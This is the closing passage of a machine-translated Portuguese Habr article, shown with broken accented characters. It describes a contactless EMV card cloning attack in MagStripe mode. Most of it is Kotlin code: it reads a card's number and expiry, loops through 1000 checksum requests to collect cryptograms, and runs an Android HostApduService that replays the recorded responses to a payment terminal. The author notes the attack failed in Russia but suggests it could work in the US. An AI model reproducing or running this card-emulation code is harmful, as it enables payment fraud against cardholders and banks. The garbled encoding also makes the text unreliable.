<br><br>  Como resultado, tudo isso pode ser gravado em um arquivo e usado j√° ao trabalhar com este terminal.  Aqui temos o nome e o n√∫mero do cart√£o, podemos exibi-lo na tela. <br><br><pre> <code class="plaintext hljs"> private fun readCardMagStripe() { try { var response = execute(Commands.SELECT_PPSE) //       val select = Commands.SELECT_APPLICATION.apply { Nc = response.toHex().substring(52, 68) SW1WS2 = "00" } val cardtype: String = getTypeCard(select.split()) execute(select) execute(Commands.GET_PROCESSING_OPTIONS) response = execute(Commands.READ_RECORD_1.apply { P2 = "0C" Lc = "00" Le = "" Nc = "" }) if (cardtype === "MasterCard") { cardnumber = "Card number: ${response.getCards()}" cardexpiration = "Card expiration: ${response.getExpired()}" showData() for (i in 0..999) { execute(Commands.GET_PROCESSING_OPTIONS, false) execute(Commands.COMPUTE_CRYPTOGRAPHIC_CHECKSUM.apply { Lc = "04" Nc = "00000${String.format("%03d", i)}".replace("..(?!$)".toRegex(), "$0 ") }) } } finishRead() }</code> </pre><br>  Um conjunto de comandos que precisamos. <br><br><pre> <code class="plaintext hljs">object Commands { val SELECT_PPSE = Command(CLA = "00", INS = "A4", P1 = "04", P2 = "00", Lc = "0E", Nc = "32 50 41 59 2E 53 59 53 2E 44 44 46 30 31 00") val SELECT_APPLICATION = Command(CLA = "00", INS = "A4", P1 = "04", P2 = "00", Nc = "07") val GET_PROCESSING_OPTIONS = Command(CLA = "80", INS = "A8", P1 = "00", P2 = "00", Lc = "02", Nc = "83 00", Le = "00") val READ_RECORD_1 = Command(CLA = "00", INS = "B2", P1 = "01", P2 = "14", Lc = "00", Le = "00") val READ_RECORD_2 = Command(CLA = "00", INS = "B2", P1 = "01", P2 = "1C", Lc = "00", Le = "00") val READ_RECORD_3 = Command(CLA = "00", INS = "B2", P1 = "01", P2 = "24", Lc = "00", Le = "00") val READ_RECORD_4 = Command(CLA = "00", INS = "B2", P1 = "02", P2 = "24", Lc = "00", Le = "00") val COMPUTE_CRYPTOGRAPHIC_CHECKSUM = Command(CLA = "80", INS = "2A", P1 = "8E", P2 = "80", Le = "00") }</code> </pre><br>  Para implementar a escuta telef√¥nica de comandos do terminal, voc√™ precisa iniciar o servi√ßo e declar√°-lo no manifesto.  Neste servi√ßo, um comando do terminal trata processCommandApdu, o comparamos com o que est√° armazenado no arquivo e fornecemos a resposta, que est√° escrita na pr√≥xima linha. <br><br><pre> <code class="xml hljs"> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">".NfcService"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:exported</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"true"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:permission</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.BIND_NFC_SERVICE"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.nfc.cardemulation.action.HOST_APDU_SERVICE"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">category</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.category.DEFAULT"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">meta-data</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.nfc.cardemulation.host_apdu_service"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:resource</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"@xml/apdu_config"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br><pre> <code class="plaintext hljs">class NfcService : HostApduService() { fun getData(context: Context?): List&lt;Command&gt; { var list: List&lt;Command&gt; = arrayListOf() filePath?.let { if (it.isNotBlank()) { list = getCommands(Uri.fromFile(File(it)).readTextFromUri(context), this::showError) } else { Toast.makeText(applicationContext, "Not found file path", Toast.LENGTH_SHORT).show() } } return list } private var commands: List&lt;Command&gt;? = arrayListOf() override fun processCommandApdu(apdu: ByteArray?, bundle: Bundle?): ByteArray { commands = getData(applicationContext) commands?.forEachIndexed { i, command -&gt; if (apdu.toHex() == command.getHexString()) { return commands!![i+1].split() } } Log.e("LOG", "Finnish") return Value.magStripModeEmulated.hexToByteArray() }</code> </pre> <br>  Algumas capturas de tela do aplicativo.  Lemos o log do cart√£o e do parsim: <br><br><img src="https://habrastorage.org/webt/0p/qt/vj/0pqtvjicqlg6hh4iorgruoljd_w.png"><br><br>  Assim, √© poss√≠vel simular a opera√ß√£o de um cart√£o EMV sem contato em um telefone com dados do cart√£o.  Felizmente ou infelizmente para algu√©m, esse ataque n√£o funciona na R√∫ssia.  De acordo com nossos experimentos, a transa√ß√£o chegava o tempo todo ao banco do emissor e era rejeitada pelo pr√≥prio banco.  Al√©m disso, n√£o foi poss√≠vel realizar uma transa√ß√£o offline usando o MagStripe.  No entanto, esse ataque pode muito bem ser implementado em outros pa√≠ses onde o uso do modo MagStripe √© bastante comum e o algoritmo de gerenciamento de riscos √© um pouco diferente, por exemplo, nos EUA. <br><br><h4>  Links com a ajuda deste artigo </h4><br>  Cart√µes de microprocessadores banc√°rios / I.M. Goldovsky - M.: TsIPSiR: Alpina Pub Lakers, 2010 - 686 p. <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Projeto EMV: passo a passo</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Pesquisa de pesquisadores austr√≠acos</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Link para o c√≥digo do aplicativo</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Simulador de terminal.</a> <br><br>  Obrigado ao <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" class="user_link">barracud4</a> por <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" class="user_link">me</a> ajudar a preparar este artigo. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt421543/">https://habr.com/ru/post/pt421543/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt421529/index.html">Netflix, Uber, Google e voc√™ no MBLT DEV 2018</a></li>
<li><a href="../pt421531/index.html">Como integrar o ReactJS ao 1C-Bitrix com gera√ß√£o autom√°tica de modelos no back-end usando o exemplo da rede Globus</a></li>
<li><a href="../pt421533/index.html">Escolhendo uma linguagem de programa√ß√£o: 3 dicas de um programador da Apple</a></li>
<li><a href="../pt421535/index.html">Aventura - Eletr√¥nica. Em um balan√ßo alado no mundo da TI</a></li>
<li><a href="../pt421537/index.html">Fun√ß√µes de ordem superior em JS: curso de lutador jovem</a></li>
<li><a href="../pt421545/index.html">Revis√£o do PocketBook 616 - o bolso 2018 mais econ√¥mico com fun√ß√£o de luz de fundo</a></li>
<li><a href="../pt421547/index.html">Aceita√ß√£o independente do data center</a></li>
<li><a href="../pt421549/index.html">Estamos escrevendo documenta√ß√£o t√©cnica: um guia para o leigo</a></li>
<li><a href="../pt421551/index.html">Dominando Vuex - De Zero a Her√≥i</a></li>
<li><a href="../pt421553/index.html">Compartilhamos conte√∫do tecnol√≥gico: reunimos todos os nossos materiais em um site</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>